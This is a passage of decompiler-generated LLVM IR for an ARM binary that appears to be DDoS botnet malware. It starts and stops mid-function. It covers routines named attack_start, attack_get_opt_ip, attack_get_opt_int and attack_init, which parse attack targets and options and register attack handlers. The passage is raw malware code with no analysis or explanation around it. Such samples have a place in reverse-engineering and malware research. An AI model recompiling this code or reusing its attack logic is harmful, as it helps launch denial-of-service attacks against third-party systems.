  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_12d7c.33 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_12d7c.33 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_21bfc.29 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_21c00.31 to i32), i32* @r6, align 4
  store i32 47272, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_21bfd.37 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_21c00.31, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 47272, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 47272, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_21bfd.37 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd94.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_21bfd.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_21c00.31, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_bd94.39 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_bd94.39 to i32))
